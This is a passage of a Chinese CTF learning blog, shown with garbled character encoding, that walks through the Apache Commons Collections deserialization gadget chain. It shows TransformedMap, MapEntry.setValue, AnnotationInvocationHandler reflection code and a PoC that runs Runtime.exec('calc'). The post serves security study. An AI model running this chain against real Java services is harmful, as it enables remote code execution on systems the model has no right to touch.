<p>æˆ‘ä»¬å»è¿™ä¸ªç±»ä¸­çœ‹çœ‹ï¼Œè¿‡äº†å‡ ä¸ªå°æ—¶æˆ‘åˆå›æ¥äº†ï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆéš¾çœ‹æ‡‚ï¼ŒJavaååºåˆ—åŒ–ä¹Ÿå¤ªéš¾äº†å§ï¼Œä¸‹è¾ˆå­ç»å¯¹ä¸æ‰“CTF</p>
<p>åœ¨æ‰¾é“¾ä¹‹å‰ï¼Œæˆ‘æƒ³ä»‹ç»ä¸€ä¸‹å›°æ‰°æˆ‘å¾ˆä¹…çš„ä¸€ä¸ªä¸œè¥¿ï¼Œé”®å€¼å¯¹ã€‚åœ¨javaä¸­ä»€ä¹ˆä¸œè¥¿éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé”®å€¼å¯¹ä¹Ÿä¸€æ ·ã€‚</p>
<p>æˆ‘ä»¬æ‰¾åˆ°AbstractInputCheckedMapDecoratorç±»ä¸­çš„MapEntryç±»ï¼Œä¸­çš„setValueè§¦å‘äº†checkSetValue</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005213356038.png" class title="image-20251005213356038">

<p>è¿™ä¸ªç±»æ„é€ æ–¹æ³•éœ€è¦ä¸€ä¸ªå®ç°Map.Entry(è¿™æ˜¯ä¸€ä¸ªé”®å€¼å¯¹æ¥å£)çš„ç±»ï¼Œå’ŒAbstractInputCheckedMapDecoratorå¯¹è±¡ä½œä¸ºå‚æ•° </p>
<p>ç”±äºTransformedMapç»§æ‰¿äº†AbstractInputCheckedMapDecoratorï¼Œæ‰€ä»¥ä¹Ÿæœ‰MapEntryç±»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦è·å–åˆ°TransformedMapçš„MapRntryå³å¯é€šè¿‡setValueè§¦å‘checkSetValue</p>
<p>ç„¶åTransformedMapåˆç»§æ‰¿äº†AbstractInputCheckedMapDecoratorç±»(çˆ¶ç±»ä½œä¸ºå‚æ•°ç±»å‹ï¼Œå­ç±»å¯ä»¥ä½œä¸ºå‚æ•°)</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åæˆ‘ä»¬å†é¡ºç€è¿™ä¸ªç»§æ‰¿ä¸€ç›´æ‰¾ä¸‹å»ä¼šå‘ç°</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TransformedMap-&gt;AbstractInputCheckedMapDecorator-&gt;AbstractMapDecorator-&gt;Map</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>å°±è¿™æ ·ä¸€ç›´åˆ°äº†Map.Entryï¼Œä¹Ÿå°±æ˜¯è¯´ä¸Šé¢çš„æ‰€æœ‰ç±»éƒ½æœ‰è¿™ä¸ªæ¥å£ï¼Œ ç›´åˆ°AbstractInputCheckedMapDecoratorä¸­è¢«å®ç°ï¼Œåœ¨MapEntryç±»ä¸­é‡å†™äº†setValueæ–¹æ³•ï¼Œè°ƒç”¨äº†checkSetValue</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç ç±»ä¼¼</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Map</span>.Entry&lt;K, V&gt; &#123;</span><br><span class="line">    <span class="comment">// è¿™ä¸ªæ¥å£çš„å”¯ä¸€å­˜åœ¨æ„ä¹‰å°±æ˜¯è¡¨ç¤º&quot;Mapä¸­çš„ä¸€ä¸ªé”®å€¼å¯¹&quot;</span></span><br><span class="line">    K <span class="title function_">getKey</span><span class="params">()</span>;      <span class="comment">// å¿…é¡»æœ‰å…³é”®å­—</span></span><br><span class="line">    V <span class="title function_">getValue</span><span class="params">()</span>;    <span class="comment">// å¿…é¡»æœ‰å€¼</span></span><br><span class="line">    V <span class="title function_">setValue</span><span class="params">(V value)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p>è‡³äºä¸ºä»€ä¹ˆç›´åˆ°AbstractInputCheckedMapDecoratorä¸­è¢«å®ç°ï¼Œä¸»è¦æ˜¯</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç»§æ‰¿äº†AbstractMapEntryDecoratorè¿™ä¸ªç±»ï¼Œç„¶åè¿™ä¸ªç±»å®ç°äº†æ¥å£</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005215404852.png" class title="image-20251005215404852">



<p>äºæ˜¯ç°åœ¨æ¡ä»¶å……è¶³äº†</p>
<ol>
<li>æˆ‘ä»¬å¯ä»¥é€šè¿‡TransformedMapè·å–åˆ°MapEntryç±»ç„¶åè°ƒç”¨setValueæ–¹æ³•</li>
<li>setValueæ–¹æ³•ä¸­çš„parentæˆ‘ä»¬å¯æ§ï¼Œå¯ä»¥è§¦å‘checkSetValue</li>
</ol>
<p>äºæ˜¯ç›´æ¥å¯ä»¥è¿›è¡ŒRCEï¼Œç„¶åå½“åˆéš¾åˆ°æˆ‘çš„åœ°æ–¹å°±æ˜¯æˆ‘ä»¬è¯¥å¦‚ä½•è·å–åˆ°MapEntryï¼Œæˆ‘å½“åˆä¸€ç›´åœ¨æƒ³ä¸ºä»€ä¹ˆä¸å¯ä»¥ç›´æ¥transformedMap.MapEntryï¼Œè€Œè¦åƒå¤§ä½¬çš„ä»£ç ä¸­ä¸€æ ·è°ƒç”¨entrySet()æ–¹æ³•</p>
<p>åé¢æˆ‘æ‰å‘ç°MapEntryæ˜¯å†…éƒ¨ç±»ï¼Œè™½ç„¶å‰é¢æ²¡æœ‰ä¿®é¥°ç¬¦ï¼Œä½†æ˜¯åªèƒ½ç›´æ¥åœ¨åŒ…ä¸­è¢«è®¿é—®ï¼Œè€Œä¸”setValueæ˜¯Protectæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªèƒ½å…ˆé€šè¿‡å¯ä»¥ç›´æ¥è®¿é—®åˆ°çš„æ–¹æ³•å»è·å–åˆ°MapEntry</p>
<p>è¿™é‡Œå°±æ˜¯å¤§ä½¬ä½¿ç”¨çš„<code>transformedMap.entrySet()</code>äº†ï¼Œè¿™ä¸ªå¯ä»¥è·å–åˆ°transformeMapçš„æ‰€æœ‰é”®å€¼å¯¹å¯¹è±¡ï¼ˆä¼°è®¡æ˜¯Mapçš„ä¸€ä¸ªæ–¹æ³•ï¼Œç„¶åä¸çŸ¥é“åœ¨å“ªä¸€æ­¥è¢«é‡å†™äº†ï¼‰</p>
<p>æˆ‘ä»¬è¿™ä¸ªé“¾å­å°±éœ€è¦çš„æ˜¯é—´æ¥è§¦å‘æŒ‡å®šçš„transformæ–¹æ³•</p>
<p>äºæ˜¯ç›´æ¥é€šè¿‡ä»£ç è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);<span class="comment">//å…ˆå¾€å¯¹è±¡ä¸­å†™å…¥å‚æ•°</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//èµ‹å€¼--&gt;valueTransformer = invokerTransformer</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"><span class="comment">//å¾€transformedMapä¸­å†™å…¥å‚æ•°ï¼Œç”¨äºé€šè¿‡checkSetValueè§¦å‘invokerTransformerçš„transformerå‡†å¤‡å¥½å‚æ•°</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//éå†Mapå¸¸ç”¨æ ¼å¼</span></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Object, Object&gt; entry : transformedMap.entrySet()) &#123;</span><br><span class="line"><span class="comment">//entrySet()è¿™ä¸ªæ–¹æ³•è¢«é‡å†™åç”¨æ¥è¿”å›transformedMapçš„é”®å€¼å¯¹é›†åˆï¼Œç„¶åéå†</span></span><br><span class="line">            entry.setValue(r);</span><br><span class="line"><span class="comment">//å½“éå†åˆ°MapEntryçš„æ—¶å€™å³å¯é€šè¿‡setValueæ–¹æ³•è§¦å‘checkSetValue</span></span><br><span class="line"><span class="comment">//è™½ç„¶åœ¨transformedMapä¸­æ²¡æœ‰MapEntryè¿™ä¸ªç±»ï¼Œä½†æ˜¯å®ƒçš„çˆ¶ç±»æœ‰ï¼Œäºæ˜¯å°±ç»§æ‰¿äº†</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251005221334094.png" class title="image-20251005221334094">

<p>äºæ˜¯æˆ‘ä»¬çš„ç¬¬äºŒä¸ªé“¾å­æœ‰äº†</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿›è¡ŒMapé”®å€¼å¯¹éå† --&gt; è°ƒç”¨ setValue()æ–¹æ³• --&gt; ç”± setValue()æ–¹æ³•æ¥è°ƒç”¨checkValue()æ–¹æ³•</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>





<p>äºæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®çš„å°±æ˜¯å»æƒ³åŠæ³•é€šè¿‡å…¶ä»–æ–¹æ³•è°ƒç”¨transformedMap.MapEntry.setValue()è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ¥ç€è¿½è¸ª</p>
<p>è¿™é‡Œæˆ‘åˆå¡ä½äº†ï¼Œæˆ‘æ€ä¹ˆéƒ½æ‰¾ä¸åˆ°ç›®æ ‡çš„é‚£ä¸ªç±»ï¼Œåé¢çœ‹äº†ä¸€ä¸‹å‘ç°æ˜¯JDKçš„é—®é¢˜ï¼Œå°±æ˜¯åœ¨JDKçš„sunæ–‡ä»¶å¤¹ä¸‹(å®é™…ä¸ŠJDKç›®å½•ä¸‹æ˜¯çœ‹ä¸åˆ°çš„ï¼Œåªä¸è¿‡è®¿é—®æ˜¯åœ¨sunåŒ…ä¸‹)ï¼Œè¿™äº›ç±»éœ€è¦é€šè¿‡ç¼–è¯‘çš„.jaræ–‡ä»¶è°ƒç”¨ï¼Œè¿™äº›ä»£ç åœ¨sunåŒ…ä¸‹æ˜¯ä¸èƒ½è¢«ç›´æ¥å®ä¾‹åŒ–çš„ï¼Œä¹Ÿå°±æ˜¯è¿™äº›ä¸æ˜¯ç›´æ¥ç»™å¼€å‘è€…ä½¿ç”¨çš„è€Œæ˜¯JDKå†…éƒ¨è°ƒç”¨éœ€è¦ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–ä¸‹è½½æºç æ‰èƒ½å®¡è®¡</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006193111069.png" class title="image-20251006193111069">

<p>åªæœ‰è¢«ç¼–è¯‘çš„javaæ–‡ä»¶</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006193300554.png" class title="image-20251006193300554">

<p>æˆ‘ä»¬éœ€è¦ä¸‹è½½ä¸‹æ¥æºç ï¼Œç„¶åå°†sunæ–‡ä»¶å¤¹æ”¾å…¥JDKçš„srcæ–‡ä»¶å¤¹ä¸‹</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006193351022.png" class title="image-20251006193351022">



<p>ç„¶åæˆ‘ä»¬å†å¯¹setValueæ–¹æ³•è¿›è¡Œè¿½è¸ªï¼Œå³å¯çœ‹åˆ°AnnotationInvocationHandlerè¿™ä¸ªjavaæ–‡ä»¶äº†</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006193644563.png" class title="image-20251006193644563">

<p>æˆ‘ä»¬è·Ÿè¿›AnnotationInvocationHandler.javaæ–‡ä»¶ï¼Œç»ˆäºçœ‹åˆ°é‡å†™äº†readObjectæ–¹æ³•ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™æ¡é“¾å­ç»ˆäºè¦åˆ°å¤´äº†</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006194750997.png" class title="image-20251006194750997">

<p>è¿™ä¸ªä»£ç ä¸­æˆ‘æ‡’å¾—å»çœ‹memberTypeåˆ°åº•æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæˆ‘åªçŸ¥é“æ­£å¸¸æƒ…å†µä¸‹è‚¯å®šæ˜¯ä¼šè§¦å‘setValueçš„å§</p>
<p>è€Œä¸”è¿™ä¸ªç±»æ˜¯å¯åºåˆ—åŒ–çš„</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆ‘ä»¬å¯ä»¥çœ‹æ‡‚æ˜¯é€šè¿‡memberValuesè°ƒç”¨çš„setValueæ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¸ªmemberValueså»çœ‹çœ‹æ€ä¹ˆèµ‹å€¼</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006200542840.png" class title="image-20251006200542840">

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯åœ¨æ„é€ æ–¹æ³•ä¸­è¢«èµ‹å€¼ï¼Œä½†æ˜¯æ„é€ æ–¹æ³•æ²¡æœ‰å£°æ˜ï¼Œæ‰€ä»¥è¯¥æ„é€ æ–¹æ³•çš„å±æ€§ä¸ºdefaultï¼Œåªèƒ½åœ¨æœ¬åŒ…(sun.reflect.annotation)ä¸­è¢«è°ƒç”¨ï¼Œæ‰€ä»¥åˆ©ç”¨Javaåå°„æœºåˆ¶æ¥è°ƒç”¨è¯¥æ„é€ æ–¹æ³•å¹¶è¿›è¡Œèµ‹å€¼ï¼š</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é€šè¿‡åå­—è·å–AnnotationInvocationHandlerç±»</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">AnnotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–AnnotationInvocationHandlerç±»çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æå‡æƒé™ç”¨äºå¯ä»¥ä½¿ç”¨æ„é€ æ–¹æ³•</span></span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶ç»™ memberValuesèµ‹å€¼ï¼Œä½¿å…¶å¯æ§</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥å®ç°å¯¹memberValuesè¿›è¡Œèµ‹å€¼</p>
<h3 id="3-åºåˆ—åŒ–é—®é¢˜"><a href="#3-åºåˆ—åŒ–é—®é¢˜" class="headerlink" title="3.åºåˆ—åŒ–é—®é¢˜"></a>3.åºåˆ—åŒ–é—®é¢˜</h3><p>äºæ˜¯æˆ‘ä»¬ç°åœ¨çœ‹ä¼¼é“¾å­åˆ°å¤´äº†ï¼Œä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯æœ‰ä¸€äº›é—®é¢˜ï¼Œæ— æ³•å®ç°</p>
<h4 id="1-åºåˆ—åŒ–é—®é¢˜"><a href="#1-åºåˆ—åŒ–é—®é¢˜" class="headerlink" title="1.åºåˆ—åŒ–é—®é¢˜"></a>1.åºåˆ—åŒ–é—®é¢˜</h4><p>æˆ‘ä»¬åœ¨è§¦å‘ååºåˆ—åŒ–æ¼æ´çš„æ—¶å€™åªèƒ½ä½¿ç”¨readObjectæ–¹æ³•ï¼Œä½†æ˜¯Runtime.getRuntime()ä¸­çš„Runtimeæ˜¯æ— æ³•åºåˆ—åŒ–çš„ã€‚</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251006203214750.png" class title="image-20251006203214750">

<p>æˆ‘ä»¬ä¹‹å‰çœ‹InvokerTransformerçš„æ—¶å€™å‘ç°ï¼Œå¯ä»¥é€šè¿‡å’Œå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œé€šè¿‡æ–¹æ³•åå’Œå‚æ•°æ‰§è¡Œæ–¹æ³•ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨åå°„æ¥åŠ¨æ€è°ƒç”¨getRuntime</p>
